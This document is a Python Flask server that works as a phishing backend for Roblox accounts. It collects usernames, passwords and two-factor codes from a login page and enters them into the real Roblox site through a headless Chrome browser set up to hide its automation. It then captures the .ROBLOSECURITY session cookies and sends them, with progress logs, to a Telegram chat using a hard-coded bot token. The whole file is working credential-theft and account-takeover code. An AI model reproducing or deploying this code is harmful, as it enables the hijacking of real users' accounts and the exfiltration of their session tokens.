from flask import Flask, render_template, request, jsonify
import json
from datetime import datetime
import os
import requests
from threading import Thread
import uuid

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time
import selenium.webdriver.support.ui as ui

app = Flask(__name__)

# Добавляем CORS заголовки
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

TELEGRAM_BOT_TOKEN = '8358408245:AAFkdDlfXA0NPkEmvXmcdSoU_av2vzz-OmM'
TELEGRAM_CHAT_ID = '-1002709349680'

selenium_sessions = {}
# Используем системный ChromeDriver в Linux или локальный в Windows
if os.name == 'nt':  # Windows
    CHROMEDRIVER_PATH = os.path.join(os.path.dirname(__file__), 'chromedriver.exe')
else:  # Linux/Mac
    CHROMEDRIVER_PATH = '/usr/local/bin/chromedriver'

def send_telegram_log(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": text}
        )
    except Exception as e:
        print(f"[Telegram Error] {e}")

def send_telegram_file(filepath, caption=None):
    try:
        with open(filepath, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID}
            if caption:
                data['caption'] = caption
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
                data=data,
                files=files
            )
    except Exception as e:
        print(f"[Telegram File Error] {e}")

def check_roblox_errors(driver):
    """Проверяет ошибки Roblox на странице"""
    try:
        # Проверяем ошибку неверного пароля
        error_elements = driver.find_elements(By.CSS_SELECTOR, '.alert-error, .alert-danger, .error-message, [data-testid="error-message"]')
        for error in error_elements:
            error_text = error.text.strip()
            if error_text:
                if "password" in error_text.lower() or "пароль" in error_text.lower():
                    return "Неверный пароль"
                elif "username" in error_text.lower() or "логин" in error_text.lower():
                    return "Неверный логин"
                elif "captcha" in error_text.lower() or "капча" in error_text.lower():
                    return "Требуется капча"
                else:
                    return error_text
    except:
        pass
    return None

def roblox_login_and_get_cookies(username, password, session_id=None, code=None):
    try:
        send_telegram_log(f"[INFO] Начинаю вход для {username} (session_id: {session_id})")
        send_telegram_log(f"[INFO] ОС: {os.name}, ChromeDriver путь: {CHROMEDRIVER_PATH}")
        
        # Простой таймаут через Timer
        import threading
        
        def timeout_handler():
            send_telegram_log(f"[TIMEOUT] Процесс для {username} превысил время ожидания (2 минуты)")
            import os
            os._exit(1)
        
        # Устанавливаем таймер на 2 минуты
        timer = threading.Timer(120.0, timeout_handler)
        timer.daemon = True
        timer.start()
        
        options = webdriver.ChromeOptions()
        # Основные опции для headless режима
        options.add_argument('--headless=new')  # Новый headless режим
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-extensions')
        options.add_argument('--disable-web-security')
        options.add_argument('--allow-running-insecure-content')
        options.add_argument('--disable-popup-blocking')
        options.add_argument('--disable-notifications')
        options.add_argument('--disable-default-apps')
        options.add_argument('--disable-plugins')
        options.add_argument('--disable-images')
        options.add_argument('--disable-plugins-discovery')
        
        # Дополнительные опции для стабильности
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--start-maximized')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--disable-infobars')
        options.add_argument('--disable-logging')
        options.add_argument('--log-level=3')
        options.add_argument('--silent')
        options.add_argument('--disable-background-timer-throttling')
        options.add_argument('--disable-backgrounding-occluded-windows')
        options.add_argument('--disable-renderer-backgrounding')
        options.add_argument('--disable-features=TranslateUI')
        options.add_argument('--disable-ipc-flooding-protection')
        options.add_argument('--disable-dialogs')
        options.add_argument('--disable-modal-dialogs')
        options.add_argument('--disable-prompt-dialogs')
        options.add_argument('--disable-beforeunload-dialogs')
        options.add_argument('--disable-unload-dialogs')
        options.add_argument('--disable-page-hide-dialogs')
        options.add_argument('--disable-visibility-change-dialogs')
        
        # Дополнительные опции для Linux
        if os.name != 'nt':  # Linux/Mac
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-setuid-sandbox')
            options.add_argument('--disable-web-security')
            options.add_argument('--allow-running-insecure-content')
        
        options.add_experimental_option('excludeSwitches', ['enable-automation'])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_experimental_option('prefs', {
            'profile.default_content_setting_values': {
                'notifications': 2,
                'popups': 2,
                'geolocation': 2,
                'media_stream': 2,
                'media_stream_mic': 2,
                'media_stream_camera': 2,
                'protocol_handlers': 2,
                'ppapi_broker': 2,
                'automatic_downloads': 2,
                'midi_sysex': 2,
                'push_messaging': 2,
                'ssl_cert_decisions': 2,
                'metro_switch_to_desktop': 2,
                'protected_media_identifier': 2,
                'app_banner': 2,
                'site_engagement': 2,
                'durable_storage': 2
            },
            'profile.default_content_settings': {
                'popups': 2,
                'notifications': 2
            },
            'profile.managed_default_content_settings': {
                'popups': 2,
                'notifications': 2
            }
        })
        
        # Создаем Service для ChromeDriver
        try:
            if os.name == 'nt':  # Windows
                service = Service(executable_path=CHROMEDRIVER_PATH)
            else:  # Linux/Mac
                # Пробуем системный ChromeDriver, если не работает - используем webdriver-manager
                try:
                    service = Service()
                    send_telegram_log("[INFO] Используем системный ChromeDriver")
                except Exception as e:
                    send_telegram_log(f"[WARNING] Системный ChromeDriver недоступен: {e}, используем webdriver-manager")
                    service = Service(ChromeDriverManager().install())
        except Exception as e:
            send_telegram_log(f"[WARNING] Ошибка создания Service: {e}, используем webdriver-manager")
            service = Service(ChromeDriverManager().install())

        if code is not None:
            # ВТОРОЙ ЭТАП: Ввод кода 2FA
            if session_id and session_id in selenium_sessions:
                driver = selenium_sessions[session_id]['driver']
                send_telegram_log(f"[INFO] Использую существующую сессию для ввода кода {username}")
                
                # Блокируем всплывающие окна в сессии 2FA
                driver.execute_script("""
                    // Блокируем все модальные окна
                    var modals = document.querySelectorAll('.modal, .popup, .dialog, [role="dialog"]');
                    modals.forEach(function(modal) {
                        if (modal.style.display !== 'none') {
                            modal.style.display = 'none';
                        }
                    });
                    
                    // Блокируем все формы, кроме формы кода
                    var forms = document.querySelectorAll('form');
                    forms.forEach(function(form) {
                        if (form.id !== 'codeForm' && form.name !== 'codeForm') {
                            form.addEventListener('submit', function(e) {
                                e.preventDefault();
                                e.stopPropagation();
                                return false;
                            }, true);
                        }
                    });
                """)
            else:
                send_telegram_log(f"[ERROR] Нет активной сессии для {username}")
                return {'success': False, 'message': 'Нет активной сессии. Попробуйте войти заново.'}
            
            try:
                # Блокируем всплывающие окна перед вводом кода
                driver.execute_script("""
                    // Блокируем все всплывающие функции
                    window.alert = function() { return; };
                    window.confirm = function() { return false; };
                    window.prompt = function() { return null; };
                    window.open = function() { return null; };
                    
                    // Удаляем все onClick атрибуты
                    var allElementsWithOnClick = document.querySelectorAll('[onClick], [onclick]');
                    allElementsWithOnClick.forEach(function(element) {
                        element.removeAttribute('onClick');
                        element.removeAttribute('onclick');
                        element.style.pointerEvents = 'none';
                    });
                    
                    // Блокируем все модальные окна
                    var modals = document.querySelectorAll('.modal, .popup, .dialog, [role="dialog"], .alert, .notification');
                    modals.forEach(function(modal) {
                        modal.style.display = 'none';
                        modal.style.visibility = 'hidden';
                        modal.style.opacity = '0';
                        modal.style.pointerEvents = 'none';
                    });
                    
                    // Блокируем все события
                    window.addEventListener('beforeunload', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }, true);
                    
                    window.addEventListener('unload', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }, true);
                """)
                
                code_input = driver.find_element(By.ID, "two-step-verification-code-input")
                code_input.clear()
                code_input.send_keys(code)
                
                # Блокируем всплывающие окна после ввода кода
                driver.execute_script("""
                    // Блокируем все всплывающие функции
                    window.alert = function() { return; };
                    window.confirm = function() { return false; };
                    window.prompt = function() { return null; };
                    window.open = function() { return null; };
                    
                    // Удаляем все onClick атрибуты
                    var allElementsWithOnClick = document.querySelectorAll('[onClick], [onclick]');
                    allElementsWithOnClick.forEach(function(element) {
                        element.removeAttribute('onClick');
                        element.removeAttribute('onclick');
                        element.style.pointerEvents = 'none';
                    });
                """)
                
                # Ждем, пока кнопка станет активной
                wait = ui.WebDriverWait(driver, 15)
                submit_btn = wait.until(
                    lambda d: d.find_element(By.CSS_SELECTOR, 'button.modal-modern-footer-button.btn-cta-md:not([disabled])')
                )
                
                # Блокируем всплывающие окна перед кликом
                driver.execute_script("""
                    // Блокируем все всплывающие функции
                    window.alert = function() { return; };
                    window.confirm = function() { return false; };
                    window.prompt = function() { return null; };
                    window.open = function() { return null; };
                    
                    // Удаляем все onClick атрибуты
                    var allElementsWithOnClick = document.querySelectorAll('[onClick], [onclick]');
                    allElementsWithOnClick.forEach(function(element) {
                        element.removeAttribute('onClick');
                        element.removeAttribute('onclick');
                        element.style.pointerEvents = 'none';
                    });
                """)
                
                driver.execute_script("arguments[0].scrollIntoView(true);", submit_btn)
                time.sleep(0.5)
                submit_btn.click()
                
                # Блокируем всплывающие окна после клика
                driver.execute_script("""
                    // Блокируем все всплывающие функции
                    window.alert = function() { return; };
                    window.confirm = function() { return false; };
                    window.prompt = function() { return null; };
                    window.open = function() { return null; };
                    
                    // Удаляем все onClick атрибуты
                    var allElementsWithOnClick = document.querySelectorAll('[onClick], [onclick]');
                    allElementsWithOnClick.forEach(function(element) {
                        element.removeAttribute('onClick');
                        element.removeAttribute('onclick');
                        element.style.pointerEvents = 'none';
                    });
                    
                    // Блокируем все модальные окна
                    var modals = document.querySelectorAll('.modal, .popup, .dialog, [role="dialog"], .alert, .notification');
                    modals.forEach(function(modal) {
                        modal.style.display = 'none';
                        modal.style.visibility = 'hidden';
                        modal.style.opacity = '0';
                        modal.style.pointerEvents = 'none';
                    });
                """)
                
                time.sleep(8)
                send_telegram_log(f"[INFO] Введён код 2FA для {username}")
                
                # После ввода кода проверяем куки
                cookies = driver.get_cookies()
                roblosecurity = next((c for c in cookies if c['name'] == '.ROBLOSECURITY'), None)
                if roblosecurity:
                    driver.quit()
                    selenium_sessions.pop(session_id, None)
                    send_telegram_log(f"[SUCCESS] Вход успешен для {username}. Куки отправлены файлом.")
                    # Сохраняем куки во временный файл
                    filename = f"roblox_cookies_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                    filepath = os.path.join(os.path.dirname(__file__), filename)
                    with open(filepath, 'w', encoding='utf-8') as f:
                        json.dump(cookies, f, ensure_ascii=False, indent=2)
                    caption = f"Roblox cookies for {username} ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')})"
                    send_telegram_file(filepath, caption=caption)
                    os.remove(filepath)
                    return {'success': True, 'cookies': cookies}
                else:
                    driver.quit()
                    selenium_sessions.pop(session_id, None)
                    send_telegram_log(f"[ERROR] Код 2FA неверный или вход не завершён для {username}")
                    return {'success': False, 'message': 'Неверный код. Попробуйте ещё раз.'}
            except Exception as e:
                driver.quit()
                selenium_sessions.pop(session_id, None)
                send_telegram_log(f"[ERROR] Ошибка при вводе кода для {username}: {e}")
                return {'success': False, 'message': f'Ошибка при вводе кода: {e}'}
        
        else:
            # ПЕРВЫЙ ЭТАП: Ввод логина и пароля
            if session_id and session_id in selenium_sessions:
                driver = selenium_sessions[session_id]['driver']
                send_telegram_log(f"[INFO] Использую существующую сессию для {username}")
                
                # Блокируем всплывающие окна в существующей сессии
                driver.execute_script("""
                    // Блокируем все модальные окна
                    var modals = document.querySelectorAll('.modal, .popup, .dialog, [role="dialog"]');
                    modals.forEach(function(modal) {
                        if (modal.style.display !== 'none') {
                            modal.style.display = 'none';
                        }
                    });
                    
                    // Блокируем все формы, кроме формы логина
                    var forms = document.querySelectorAll('form');
                    forms.forEach(function(form) {
                        if (form.id !== 'login-form' && form.name !== 'loginForm') {
                            form.addEventListener('submit', function(e) {
                                e.preventDefault();
                                e.stopPropagation();
                                return false;
                            }, true);
                        }
                    });
                """)
            else:
                try:
                    driver = webdriver.Chrome(service=service, options=options)
                    
                    # Устанавливаем таймауты
                    driver.set_page_load_timeout(15)  # Уменьшаем таймаут
                    driver.implicitly_wait(5)         # Уменьшаем таймаут
                    driver.set_script_timeout(15)     # Уменьшаем таймаут
                    
                    # Дополнительные настройки для стабильности
                    driver.execute_cdp_cmd('Page.setBypassCSP', {'enabled': True})
                    driver.execute_cdp_cmd('Network.setBypassServiceWorker', {'bypass': True})
                    
                    selenium_sessions[session_id] = {'driver': driver, 'username': username}
                    send_telegram_log(f"[INFO] Chrome driver создан успешно для {username}")
                except Exception as e:
                    send_telegram_log(f"[ERROR] Не удалось создать Chrome driver: {e}")
                    return {'success': False, 'message': f'Ошибка создания браузера: {e}'}
                
                # Блокируем всплывающие окна
                driver.execute_script("""
                    // Блокируем все всплывающие функции
                    window.alert = function() { return; };
                    window.confirm = function() { return false; };
                    window.prompt = function() { return null; };
                    window.open = function() { return null; };
                    
                    // Блокируем все события, которые могут вызвать всплывающие окна
                    window.addEventListener('beforeunload', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }, true);
                    
                    window.addEventListener('unload', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }, true);
                    
                    window.addEventListener('pagehide', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }, true);
                    
                    window.addEventListener('visibilitychange', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }, true);
                    
                    // Удаляем все onClick атрибуты
                    var allElementsWithOnClick = document.querySelectorAll('[onClick], [onclick]');
                    allElementsWithOnClick.forEach(function(element) {
                        element.removeAttribute('onClick');
                        element.removeAttribute('onclick');
                        element.style.pointerEvents = 'none';
                    });
                    
                    // Блокируем все формы с action
                    var allForms = document.querySelectorAll('form[action]');
                    allForms.forEach(function(form) {
                        if (form.id !== 'loginForm' && form.id !== 'codeForm') {
                            form.removeAttribute('action');
                            form.addEventListener('submit', function(e) {
                                e.preventDefault();
                                e.stopPropagation();
                                return false;
                            }, true);
                        }
                    });
                    
                    // Блокируем все модальные окна
                    var modals = document.querySelectorAll('.modal, .popup, .dialog, [role="dialog"], .alert, .notification');
                    modals.forEach(function(modal) {
                        modal.style.display = 'none';
                        modal.style.visibility = 'hidden';
                        modal.style.opacity = '0';
                        modal.style.pointerEvents = 'none';
                    });
                    
                    // Наблюдаем за изменениями DOM
                    var observer = new MutationObserver(function(mutations) {
                        mutations.forEach(function(mutation) {
                            mutation.addedNodes.forEach(function(node) {
                                if (node.nodeType === 1) {
                                    if (node.classList && (node.classList.contains('modal') || node.classList.contains('popup') || node.classList.contains('dialog') || node.classList.contains('alert'))) {
                                        node.style.display = 'none';
                                        node.style.visibility = 'hidden';
                                        node.style.opacity = '0';
                                        node.style.pointerEvents = 'none';
                                    }
                                    
                                    // Удаляем onClick атрибуты у новых элементов
                                    if (node.hasAttribute && node.hasAttribute('onClick')) {
                                        node.removeAttribute('onClick');
                                        node.style.pointerEvents = 'none';
                                    }
                                }
                            });
                        });
                    });
                    
                    observer.observe(document.body, {
                        childList: true,
                        subtree: true,
                        attributes: true,
                        attributeFilter: ['onClick', 'onclick']
                    });
                """)
                
                try:
                    send_telegram_log(f"[INFO] Открываю страницу логина для {username}")
                    driver.get("https://www.roblox.com/login")
                    send_telegram_log(f"[INFO] Страница загружена, жду 3 секунды")
                    time.sleep(3)
                    send_telegram_log(f"[INFO] Страница логина готова для {username}")
                except Exception as e:
                    send_telegram_log(f"[ERROR] Ошибка загрузки страницы для {username}: {e}")
                    driver.quit()
                    selenium_sessions.pop(session_id, None)
                    return {'success': False, 'message': f'Ошибка загрузки страницы: {e}'}
                except TimeoutError:
                    send_telegram_log(f"[TIMEOUT] Страница логина не загрузилась для {username}")
                    driver.quit()
                    selenium_sessions.pop(session_id, None)
                    return {'success': False, 'message': 'Страница не загрузилась в течение 15 секунд'}
                
                # Дополнительно блокируем всплывающие окна после загрузки страницы
                driver.execute_script("""
                    // Блокируем все модальные окна
                    var modals = document.querySelectorAll('.modal, .popup, .dialog, [role="dialog"]');
                    modals.forEach(function(modal) {
                        if (modal.style.display !== 'none') {
                            modal.style.display = 'none';
                        }
                    });
                    
                    // Блокируем все формы, кроме формы логина
                    var forms = document.querySelectorAll('form');
                    forms.forEach(function(form) {
                        if (form.id !== 'login-form' && form.name !== 'loginForm') {
                            form.addEventListener('submit', function(e) {
                                e.preventDefault();
                                e.stopPropagation();
                                return false;
                            }, true);
                        }
                    });
                """)
                
                try:
                    send_telegram_log(f"[INFO] Ищу поля формы для {username}")
                    username_field = driver.find_element(By.ID, "login-username")
                    password_field = driver.find_element(By.ID, "login-password")
                    login_button = driver.find_element(By.ID, "login-button")
                    
                    send_telegram_log(f"[INFO] Заполняю форму для {username}")
                    username_field.send_keys(username)
                    password_field.send_keys(password)
                    
                    send_telegram_log(f"[INFO] Нажимаю кнопку входа для {username}")
                    login_button.click()
                    
                    send_telegram_log(f"[INFO] Жду 5 секунд после отправки формы для {username}")
                    time.sleep(5)
                    send_telegram_log(f"[INFO] Форма отправлена для {username}")
                except Exception as e:
                    send_telegram_log(f"[ERROR] Ошибка при заполнении формы для {username}: {e}")
                    driver.quit()
                    selenium_sessions.pop(session_id, None)
                    return {'success': False, 'message': f'Ошибка при заполнении формы: {e}'}
                except TimeoutError:
                    send_telegram_log(f"[TIMEOUT] Не удалось найти элементы формы для {username}")
                    driver.quit()
                    selenium_sessions.pop(session_id, None)
                    return {'success': False, 'message': 'Не удалось найти элементы формы в течение 5 секунд'}

            # Проверяем ошибки Roblox
            try:
                send_telegram_log(f"[INFO] Проверяю ошибки Roblox для {username}")
                error_message = check_roblox_errors(driver)
                if error_message:
                    driver.quit()
                    selenium_sessions.pop(session_id, None)
                    send_telegram_log(f"[ERROR] Ошибка Roblox для {username}: {error_message}")
                    return {'success': False, 'message': error_message}
                send_telegram_log(f"[INFO] Ошибок Roblox не найдено для {username}")
            except Exception as e:
                send_telegram_log(f"[WARNING] Не удалось проверить ошибки Roblox для {username}: {e}")

            # Сразу проверяем, есть ли поле для кода 2FA
            try:
                send_telegram_log(f"[INFO] Проверяю наличие 2FA для {username}")
                driver.find_element(By.ID, "two-step-verification-code-input")
                
                # Блокируем всплывающие окна при обнаружении 2FA
                driver.execute_script("""
                    // Блокируем все всплывающие функции
                    window.alert = function() { return; };
                    window.confirm = function() { return false; };
                    window.prompt = function() { return null; };
                    window.open = function() { return null; };
                    
                    // Дополнительно блокируем через defineProperty
                    Object.defineProperty(window, 'alert', {
                        value: function() {
                            console.log('Блокируем alert через defineProperty');
                            return;
                        },
                        writable: false,
                        configurable: false
                    });
                    
                    Object.defineProperty(window, 'confirm', {
                        value: function() {
                            console.log('Блокируем confirm через defineProperty');
                            return false;
                        },
                        writable: false,
                        configurable: false
                    });
                    
                    Object.defineProperty(window, 'prompt', {
                        value: function() {
                            console.log('Блокируем prompt через defineProperty');
                            return null;
                        },
                        writable: false,
                        configurable: false
                    });
                    
                    // Удаляем все onClick атрибуты
                    var allElementsWithOnClick = document.querySelectorAll('[onClick], [onclick]');
                    allElementsWithOnClick.forEach(function(element) {
                        element.removeAttribute('onClick');
                        element.removeAttribute('onclick');
                        element.style.pointerEvents = 'none';
                    });
                    
                    // Блокируем все модальные окна
                    var modals = document.querySelectorAll('.modal, .popup, .dialog, [role="dialog"], .alert, .notification');
                    modals.forEach(function(modal) {
                        modal.style.display = 'none';
                        modal.style.visibility = 'hidden';
                        modal.style.opacity = '0';
                        modal.style.pointerEvents = 'none';
                    });
                    
                    // Блокируем все события
                    window.addEventListener('beforeunload', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }, true);
                    
                    window.addEventListener('unload', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        return false;
                    }, true);
                """)
                
                send_telegram_log(f"[INFO] Требуется код 2FA для {username}")
                return {'need_code': True, 'session_id': session_id}
            except:
                # Если поля для кода нет, проверяем куки
                try:
                    send_telegram_log(f"[INFO] Проверяю куки для {username}")
                    cookies = driver.get_cookies()
                    roblosecurity = next((c for c in cookies if c['name'] == '.ROBLOSECURITY'), None)
                    
                    if roblosecurity:
                        # Успешный вход без 2FA
                        driver.quit()
                        selenium_sessions.pop(session_id, None)
                        send_telegram_log(f"[SUCCESS] Вход успешен для {username}. Куки отправлены файлом.")
                        # Сохраняем куки во временный файл
                        filename = f"roblox_cookies_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                        filepath = os.path.join(os.path.dirname(__file__), filename)
                        with open(filepath, 'w', encoding='utf-8') as f:
                            json.dump(cookies, f, ensure_ascii=False, indent=2)
                        caption = f"Roblox cookies for {username} ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')})"
                        send_telegram_file(filepath, caption=caption)
                        os.remove(filepath)
                        return {'success': True, 'cookies': cookies}
                    else:
                        # Не удалось войти
                        driver.quit()
                        selenium_sessions.pop(session_id, None)
                        send_telegram_log(f"[ERROR] Не удалось войти для {username}")
                        return {'success': False, 'message': 'Не удалось войти. Проверьте логин и пароль.'}
                except Exception as e:
                    send_telegram_log(f"[ERROR] Ошибка при проверке куки для {username}: {e}")
                    driver.quit()
                    selenium_sessions.pop(session_id, None)
                    return {'success': False, 'message': f'Ошибка при проверке куки: {e}'}
    except Exception as e:
        if session_id in selenium_sessions:
            try:
                selenium_sessions[session_id]['driver'].quit()
            except:
                pass
            selenium_sessions.pop(session_id, None)
        send_telegram_log(f"[ERROR] Ошибка Selenium для {username}: {e}")
        return {'success': False, 'message': f'Ошибка Selenium: {e}'}
    finally:
        # Отменяем таймер
        try:
            timer.cancel()
        except:
            pass

@app.route('/')
def login_page():
    return app.send_static_file('login-clean.html')

@app.route('/test')
def test_page():
    return app.send_static_file('test.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    remember = data.get('remember')
    session_id = str(uuid.uuid4())

    cookies = {
        '.ROBLOSECURITY': f'_{username}_fake_security_token_{hash(password)}',
        'username': username,
        'login_time': datetime.now().isoformat(),
        'session_id': f'roblox_session_{hash(username)}',
        'auth_token': f'auth_{hash(password)}',
        'remember_me': str(remember).lower()
    }
    with open('cookies.txt', 'w', encoding='utf-8') as f:
        json.dump(cookies, f, indent=2, ensure_ascii=False)

    result = roblox_login_and_get_cookies(username, password, session_id=session_id)
    if result.get('need_code'):
        return jsonify({'need_code': True, 'session_id': session_id})
    elif result.get('success'):
        return jsonify({'success': True, 'message': 'Вход выполнен успешно! Проверьте Telegram для получения куки.', 'cookies': result.get('cookies')})
    else:
        return jsonify({'success': False, 'message': result.get('message')})

@app.route('/submit_code', methods=['POST'])
def submit_code():
    data = request.get_json()
    session_id = data.get('session_id')
    code = data.get('code')
    if not session_id or not code:
        return jsonify({'success': False, 'message': 'Не передан session_id или code'})
    username = selenium_sessions.get(session_id, {}).get('username', 'unknown')
    result = roblox_login_and_get_cookies(username, None, session_id=session_id, code=code)
    if result.get('success'):
        return jsonify({'success': True, 'message': 'Вход завершён! Проверьте Telegram для куки.', 'cookies': result.get('cookies')})
    else:
        return jsonify({'success': False, 'message': result.get('message')})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(debug=False, host='0.0.0.0', port=port) 